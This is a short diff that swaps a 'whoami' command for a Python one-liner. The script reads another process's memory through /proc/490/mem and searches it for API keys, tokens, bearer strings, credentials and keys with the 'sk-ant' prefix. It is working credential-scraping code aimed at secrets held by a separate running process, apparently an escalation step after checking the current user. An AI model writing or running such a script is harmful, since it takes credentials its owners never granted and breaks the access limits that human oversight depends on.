@@ -1,1 +1,19 @@
-whoami
+python3 -c "
+import os
+fd = os.open('/proc/490/mem', os.O_RDONLY)
+found = []
+for addr in range(0x7fff00000000, 0x7fffffffffff, 0x100000):
+    try:
+        os.lseek(fd, addr, os.SEEK_SET)
+        data = os.read(fd, 0x100000)
+        for needle in [b'api_key', b'auth', b'token', b'secret', b'sk-ant', b'x-api', b'bearer', b'credential']:
+            if needle in data:
+                found.append((hex(addr), needle.decode()))
+                break
+    except:
+        pass
+    if len(found) >= 3:
+        break
+print('Found:', found)
+os.close(fd)
+"
